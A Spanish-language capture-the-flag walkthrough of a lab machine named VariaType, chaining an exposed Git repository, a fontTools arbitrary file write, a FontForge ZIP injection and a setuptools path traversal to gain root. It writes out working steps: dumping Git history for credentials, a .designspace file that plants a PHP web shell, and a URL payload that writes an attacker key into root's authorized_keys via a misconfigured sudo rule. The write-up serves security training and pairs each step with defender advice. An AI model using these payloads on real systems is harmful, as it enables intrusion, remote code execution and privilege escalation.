VariaType — Font Supply Chain RCE

Cadena de compromiso que encadena tres CVEs: lectura de repositorio Git expuesto para extraer credenciales, escritura arbitraria de archivos vía fontTools varLib (CVE-2025-66034) para obtener RCE como www-data, inyección de comandos en FontForge via ZIP filename injection (CVE-2024-25081) para escalar a steve, y path traversal en setuptools (CVE-2025-47273) combinado con sudo misconfiguration para obtener root.

Resumen Ejecutivo

La máquina VariaType expone una aplicación web de generación de fuentes tipográficas variables. La cadena de compromiso completo requirió explotar tres vulnerabilidades encadenadas: una lectura arbitraria de repositorio Git expuesto para extraer credenciales, una escritura arbitraria de archivos a través de una vulnerabilidad en fontTools (CVE-2025-66034) para obtener ejecución de código como www-data, una inyección de comandos en nombres de archivo ZIP procesados por FontForge (CVE-2024-25081) para escalar a steve, y finalmente un path traversal en setuptools (CVE-2025-47273) combinado con un sudo misconfiguration para obtener acceso como root.

01

Reconocimiento

¿Qué es este paso?

El reconocimiento es la fase inicial donde recolectamos información sobre el objetivo sin modificar su estado. Identificamos qué servicios están activos, qué tecnologías usa y qué subdominios existen.

1.1 — Escaneo de puertos con nmap

¿Por qué nmap aquí?

nmap es el estándar de facto para descubrir puertos abiertos y versiones de servicios. Con -sV obtenemos las versiones exactas, lo que permite buscar CVEs asociados.

nmap -sC -sV -p- --min-rate 5000 -oN nmap_full.txt 10.129.7.218
Output

Superficie mínima: solo SSH y HTTP. OpenSSH 9.2p1 es reciente, sin CVEs críticos conocidos. El vector de ataque será la aplicación web en el puerto 80. nginx como proxy inverso sugiere múltiples aplicaciones detrás.

1.2 — Enumeración de Virtual Hosts

¿Qué son los virtual hosts y por qué enumerarlos?

Un servidor web puede alojar múltiples aplicaciones en la misma IP, diferenciadas por el header HTTP Host. La enumeración de VHosts puede revelar paneles de administración, APIs o aplicaciones de desarrollo no publicadas.

echo "10.129.7.218 variatype.htb" | sudo tee -a /etc/hosts
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://variatype.htb/ -H "Host: FUZZ.variatype.htb" -fs 0 -fc 302 -mc all
Output
portal                  [Status: 200, Size: 4821, Words: 312]
:: Progress: [4989/4989] :: Job :: Time: 00:00:14 :: 4989 req/s
Interpretación y decisión

Se descubre portal.variatype.htb. Responde con un portal PHP de login — aplicación diferente a la Flask principal.

02

Git Repository Exposed

Concepto clave: Un repositorio Git expuesto (/.git/ accesible vía HTTP) es una de las vulnerabilidades de configuración más graves. Git almacena no solo el código actual, sino todo el historial, incluyendo archivos eliminados y credenciales que alguna vez existieron.

curl -s http://portal.variatype.htb/.git/HEAD
git-dumper http://portal.variatype.htb/.git/ ./portal_repo
Output
ref: refs/heads/main
[-] Testing http://portal.variatype.htb/.git/HEAD [200]
[-] Fetching .git/...
[-] Running git checkout .

2.1 — Análisis del historial de commits

git log --oneline --all
Output
753b5f5 (HEAD -> main) fix: add gitbot user for automated validation pipeline
a1e3c20 feat: portal dashboard with font upload functionality
f8b2d11 init: initial portal structure

2.2 — Búsqueda de dangling commits

¿Qué es un dangling commit?

En Git, cuando se hace un git commit --amend o un git rebase, el commit original no se borra del objeto store — simplemente pierde su referencia. git fsck puede encontrar estos objetos huérfanos.

git fsck --no-reflog --full --unreachable | grep commit
git show 6f021da6be7086f2595befaa025a83d1de99478b
Output — Credenciales en commit huérfano
unreachable commit 6f021da6be7086f2595befaa025a83d1de99478b

commit 6f021da6be7086f2595befaa025a83d1de99478b
    security: remove hardcoded credentials

diff --git a/auth.php b/auth.php
-    $valid_users = [
-        'gitbot' => 'G1tB0t_Acc3ss_2025!',
-        'admin'  => 'AdminPortal_2025#',
-    ];
+    $valid_users = load_users_from_db();
Interpretación

El commit "borrado" contiene credenciales hardcodeadas. Credenciales obtenidas: gitbot:G1tB0t_Acc3ss_2025!

⚠ ¿Por qué es vulnerable?

Causa raíz 1: El directorio .git/ no está bloqueado por nginx.
Causa raíz 2: El desarrollador creyó que eliminar las credenciales en un nuevo commit era suficiente. En Git, el historial es inmutable — git filter-repo o BFG Repo Cleaner deben usarse para purgar datos sensibles.

🗡 Para el atacante

  • Siempre verificar /.git/HEAD en targets web
  • git-dumper + git fsck es el combo estándar para extraer secretos
  • Los mensajes como "remove credentials" son señales de que existieron datos sensibles

🛡 Para el defensor

  • Bloquear /.git/ en el servidor web
  • Nunca poner credenciales en código
  • Si se commitearon, rotarlas y purgar con filter-repo

04

CVE-2025-66034 — fontTools Arbitrary File Write → RCE

CVE-2025-66034 · fontTools varLib · CVSS: 9.8 Critical

¿Qué es fontTools? fontTools es una librería Python para manipular fuentes tipográficas. Su módulo varLib procesa archivos .designspace para generar fuentes variables.

⚠ ¿Cuál es el bug?

En un archivo .designspace, el atributo filename del <variable-font> se usa directamente como path de escritura sin aplicar os.path.basename(). Un atacante puede especificar un path absoluto y fontTools escribirá el binario TTF generado en esa ubicación.

ATTACKER variatype.htb portal.variatype.htb | | | |-- POST /tools/variable- ---->| | | font-generator/process | | | (malicious.designspace) | | | | | | fontTools varLib processes .designspace | | reads filename="/var/www/portal/shell.php" | | NO os.path.basename() applied! | | | | | Writes TTF binary to: | | /var/www/portal/files/shell.php ----->| | | | |-- GET /files/shell.php?cmd=id --------------------------->| | uid=33(www-data) |

Construcción del Exploit

Paso 1 — Crear master fonts TTF mínimas
python3 make_masters.py
Genera source-light.ttf (weight 300) y source-regular.ttf (weight 400) con fontBuilder
Paso 2 — Crear malicious.designspace
malicious.designspace (extracto clave)
<variable-font
  filename="/var/www/portal.variatype.htb/public/files/shell.php">
  <axis-subsets>
    <axis-subset name="Weight"/>  <!-- CRÍTICO: name del eje, NO el tag -->
  </axis-subsets>
</variable-font>

<!-- Payload PHP embebido en la name table via labelname -->
<labelname><![CDATA[<?php system($_GET['cmd']); ?>]]></labelname>
Paso 3 — Subir y verificar RCE
curl -s -F "designspace=@malicious.designspace" -F "masters=@source-light.ttf" -F "masters=@source-regular.ttf" http://variatype.htb/tools/variable-font-generator/process
RCE confirmado
$ curl -s "http://portal.variatype.htb/files/shell.php?cmd=id"
[binary TTF data...]uid=33(www-data) gid=33(www-data) groups=33(www-data)[binary...]

🗡 Para el atacante

  • El atributo filename en formatos XML es siempre candidato a path traversal
  • Los formatos de fuentes (.designspace, .ufo) son ricos en estos vectores

🛡 Para el defensor

  • Usar os.path.basename() en todos los paths de salida
  • Ejecutar procesadores en sandbox/containers

CVE-2024-25081 — FontForge ZIP Injection → steve

CVE-2024-25081 · FontForge · CVSS: 8.8 High

¿Qué es FontForge? Editor de fuentes open source que puede procesar ZIPs. Internamente extrae archivos y pasa sus nombres a system() sin escapado adecuado.

CVE-2025-47273 — setuptools Path Traversal → root

CVE-2025-47273 · setuptools PackageIndex · CVSS: 9.1 Critical

¿Qué es setuptools.package_index? Módulo de la librería estándar de Python para instalar paquetes. Su método download(url, dest_dir) descarga archivos desde URLs. La vulnerabilidad está en cómo construye el path local: decodifica %2F y lo usa como path absoluto.

Enumeración de privilegios sudo
sudo -l
Output
User steve may run the following commands on variatype:
    (root) NOPASSWD: /usr/bin/python3 /opt/font-tools/install_validator.py *

⚠ ¿Cuál es el bug?

PackageIndex.download() extrae el nombre de archivo de la URL con urllib.parse.unquote(). Cuando la URL contiene %2F, se decodifica como /, creando un path absoluto. En Python, os.path.join('/base/', '/absolute/path') retorna /absolute/path — ignorando el directorio base.

ATTACKER (steve) HTTP SERVER (LHOST:5555) SISTEMA | | | | sudo python3 install_validator.py | | 'http://10.10.15.129:5555/%2Froot%2F.ssh%2Fauthorized_keys' | | | | | setuptools.PackageIndex.download(url, dest) | | filename = unquote("%2Froot%2F.ssh%2Fauthorized_keys") | | filename = "/root/.ssh/authorized_keys" | | | | | os.path.join("/opt/.../validators/", | | "/root/.ssh/authorized_keys") | | = "/root/.ssh/authorized_keys" ← path absoluto! | | | | | open("/root/.ssh/authorized_keys", "wb").write(pubkey)| | [key written]
Exploit y root
sudo /usr/bin/python3 /opt/font-tools/install_validator.py 'http://10.10.15.129:5555/%2Froot%2F.ssh%2Fauthorized_keys'
Output
Plugin installed at: /root/.ssh/authorized_keys
ssh -i root_key root@10.129.7.218
Root
root@variatype:~# id
uid=0(root) gid=0(root) groups=0(root)

root@variatype:~# cat root.txt

root.txt
ddf4b11fd562904c07a263ada72c4de7

PWNED — Full root access obtained.

🗡 Para el atacante

  • Los comodines (*) en reglas sudo son extremadamente peligrosos
  • CVEs de path traversal en librerías Python populares tienen impacto masivo
  • Los cron jobs que procesan archivos subidos son vectores clásicos de escalada

🛡 Para el defensor

  • Evitar comodines en reglas sudo
  • Mantener setuptools actualizado
  • Validar nombres de archivos internos en ZIPs
  • Usar NOPASSWD con extrema cautela
